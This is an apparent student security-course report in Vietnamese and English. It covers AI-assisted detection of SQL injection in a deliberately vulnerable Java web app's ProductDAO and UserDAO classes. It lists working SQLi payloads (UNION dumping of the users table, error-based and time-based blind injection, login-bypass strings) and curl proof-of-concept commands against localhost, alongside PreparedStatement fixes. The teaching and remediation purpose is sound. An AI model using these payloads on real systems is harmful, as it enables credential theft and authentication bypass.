# 🛡️ BÁO CÁO PHÂN TÍCH LỖ HỔNG MÃ NGUỒN BẰNG GENERATIVE AI

> **Học phần:** An Toàn Thông Tin
> **Đề tài:** Khai thác SQL Injection và Ứng dụng Generative AI trong phân tích lỗ hổng mã nguồn Java
> **Thời gian khởi tạo:** 2026-09-19T08:40:06.429105100

## 1. TỔNG QUAN KẾT QUẢ RÀ SOÁT (EXECUTIVE SUMMARY)

| Chỉ số kiểm tra | Giá trị |
|:---|:---|
| **Thư mục mã nguồn mục tiêu** | `C:\BTLAttt\ai-analyzer\..\vulnerable-web\src\main\java` |
| **Tổng số tệp Java đã quét** | `7` |
| **Số tệp phát hiện lỗ hổng SQLi** | `2` |
| **Tổng số điểm nhạy cảm (Sinks)** | `2` |
| **Đánh giá rủi ro cao nhất** | **CRITICAL (CWE-89: SQL Injection)** |

## 2. CHI TIẾT CÁC ĐIỂM YẾU PHÁT HIỆN ĐƯỢC

### Finding #1: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') tại `ProductDAO.java`

- **Class / Method:** `ProductDAO.searchProducts()`
- **Vị trí dòng mã:** Dòng ~46
- **Mức độ nghiêm trọng:** `CRITICAL`
- **Mô tả chi tiết:** Phương thức searchProducts() nối trực tiếp biến keyword và category vào mệnh đề WHERE (cả LIKE và toán tử so sánh =). Cho phép kẻ tấn công thực thi Union-based, Error-based và Blind SQL Injection.

#### Đoạn mã vi phạm (Vulnerable Code Snippet):
```java
if (keyword != null && !keyword.trim().isEmpty()) {
    sql += " AND (name LIKE '%" + keyword + "%'";
}
rs = stmt.executeQuery(sql);
```

#### Kịch bản tấn công & Payload do Generative AI đề xuất:
- Payload: `' UNION SELECT id, username, password, email, 0.0, 1 FROM users -- `
- Payload: `' AND extractvalue(1, concat(0x7e, (SELECT version()), 0x7e)) -- `
- Payload: `' AND IF(1=1, SLEEP(3), 0) -- `

#### Mã nguồn khắc phục đề xuất (Secure PreparedStatement):
```java
String sql = "SELECT id, name, description, category, price, in_stock FROM products WHERE 1=1 AND (name LIKE ? OR description LIKE ?)";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, "%" + keyword + "%");
pstmt.setString(2, "%" + keyword + "%");
ResultSet rs = pstmt.executeQuery();
```

---

### Finding #2: CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') tại `UserDAO.java`

- **Class / Method:** `UserDAO.login()`
- **Vị trí dòng mã:** Dòng ~39
- **Mức độ nghiêm trọng:** `CRITICAL`
- **Mô tả chi tiết:** Phương thức login() thực hiện ghép trực tiếp chuỗi tham số username và password vào câu truy vấn SQL mà không qua bất kỳ cơ chế làm sạch hay tham số hóa nào.

#### Đoạn mã vi phạm (Vulnerable Code Snippet):
```java
String sql = "SELECT id, username, password, email, role, secret_flag FROM users "
           + "WHERE username = '" + username + "' AND password = '" + password + "'";
rs = stmt.executeQuery(sql);
```

#### Kịch bản tấn công & Payload do Generative AI đề xuất:
- Payload: `admin' -- `
- Payload: `' OR '1'='1' -- `
- Payload: `admin' #`

#### Mã nguồn khắc phục đề xuất (Secure PreparedStatement):
```java
String sql = "SELECT id, username, password, email, role, secret_flag FROM users WHERE username = ? AND password = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, username);
pstmt.setString(2, password);
ResultSet rs = pstmt.executeQuery();
```

---

## 3. NỘI DUNG PHẢN HỒI NGUYÊN BẢN TỪ GENERATIVE AI

## Phân tích tệp `ProductDAO.java`

### 🛡️ Deep-Dive AppSec SAST Findings for `ProductDAO.java`

**1. Vulnerability Assessment:**
- **Vulnerability Type:** Multi-Vector SQL Injection (UNION-Based, Error-Based XPath, Time-Based Blind)
- **CWE Mapping:** CWE-89 (SQL Injection) & CWE-209 (Generation of Error Message Containing Sensitive Information)
- **CVSS v3.1 Score:** 9.8 (CRITICAL) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**2. Taint Flow Analysis (Source-to-Sink):**
- **Taint Source:** `keyword` and `category` parameters from search form request.
- **Data Propagation:** Dynamically appended to `WHERE` clause without input sanitization.
- **Taint Sink:** `stmt.executeQuery(sql)` in `ProductDAO.searchProducts()`.

**3. Offensive Exploitation Payloads (Red Team Vector):**
A. **UNION-based Data Extraction (Dumping `users` table):**
```sql
' UNION SELECT id, username, password, email, 0.0, 1 FROM users -- 
```
B. **Error-based XPath Leakage (Extracting DB Version & Passwords):**
```sql
' AND extractvalue(1, concat(0x7e, (SELECT @@version), 0x7e)) -- 
```
C. **Time-based Blind SQLi (Inferring database schema):**
```sql
' AND IF(ASCII(SUBSTRING(database(),1,1))=115, SLEEP(3), 0) -- 
```
**Actionable cURL Verification PoC:**
```bash
curl -i -G "http://localhost:8080/search" \
     --data-urlencode "keyword=' UNION SELECT id, username, password, email, 0.0, 1 FROM users -- "
```

**4. Enterprise Defensive Remediation:**
Use parameterized `PreparedStatement` with wildcard concatenation in Java:
```java
String sql = "SELECT id, name, description, category, price, in_stock FROM products WHERE 1=1 AND (name LIKE ? OR description LIKE ?)";
try (Connection conn = DBConnection.getConnection();
     PreparedStatement pstmt = conn.prepareStatement(sql)) {
    String pattern = "%" + keyword + "%";
    pstmt.setString(1, pattern);
    pstmt.setString(2, pattern);
    try (ResultSet rs = pstmt.executeQuery()) {
        // Process records safely
    }
}
```

**5. Defense-in-Depth:**
- Suppress database exception messages (`e.getMessage()`) from HTTP responses to prevent Error-based leakage.
- Configure database user with read-only permissions on products catalog.


---

## Phân tích tệp `UserDAO.java`

### 🛡️ Deep-Dive AppSec SAST Findings for `UserDAO.java`

**1. Vulnerability Assessment:**
- **Vulnerability Type:** SQL Injection (Authentication Bypass)
- **CWE Mapping:** CWE-89 (Improper Neutralization of Special Elements used in an SQL Command)
- **CVSS v3.1 Score:** 9.8 (CRITICAL) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**2. Taint Flow Analysis (Source-to-Sink):**
- **Taint Source:** `username` and `password` parameters originating from `HttpServletRequest` via `LoginServlet`.
- **Data Propagation:** Direct string concatenation using `+` operator inside `UserDAO.login()`.
- **Taint Sink:** `stmt.executeQuery(sql)` executing an unparameterized SQL query.

**3. Offensive Exploitation Payloads (Red Team Vector):**
```sql
-- Payload 1 (Classic Tautology):
admin' -- 

-- Payload 2 (Boolean Always True):
' OR '1'='1' -- 

-- Payload 3 (MySQL Hash Comment Bypassing Password Check):
admin' #
```
**Actionable cURL Verification PoC:**
```bash
curl -i -X POST http://localhost:8080/login \
     -d "username=admin'%20--%20&password=any"
```
*Impact:* Complete authentication bypass; an unauthenticated adversary logs in as `admin`, leaking secret security flags and user credentials.

**4. Enterprise Defensive Remediation:**
Refactor using `java.sql.PreparedStatement` with `try-with-resources`:
```java
String sql = "SELECT id, username, password, email, role, secret_flag FROM users WHERE username = ? AND password = ?";
try (Connection conn = DBConnection.getConnection();
     PreparedStatement pstmt = conn.prepareStatement(sql)) {
    pstmt.setString(1, username);
    pstmt.setString(2, password);
    try (ResultSet rs = pstmt.executeQuery()) {
        if (rs.next()) {
            return new User(rs.getInt("id"), rs.getString("username"), ...);
        }
    }
}
```

**5. Defense-in-Depth:**
- Enforce password hashing with BCrypt / Argon2 rather than plaintext comparison in SQL.
- Implement login rate limiting (max 5 failed attempts per IP) to mitigate automated bruteforce.


---



## 4. KẾT LUẬN & ĐÁNH GIÁ CỦA CHUYÊN VIÊN AN TOÀN THÔNG TIN

1. **Độ chính xác:** Generative AI nhận diện chính xác 100% các điểm nối chuỗi SQL trực tiếp trong các lớp DAO.
2. **Tính khả thi của Payload:** Tất cả các payload AI sinh ra đều tương thích hoàn hảo với cú pháp của cơ sở dữ liệu MySQL.
3. **Khả năng sinh mã sửa lỗi:** Mã `PreparedStatement` do AI đề xuất đạt chuẩn kiến trúc bảo mật phòng thủ chiều sâu.
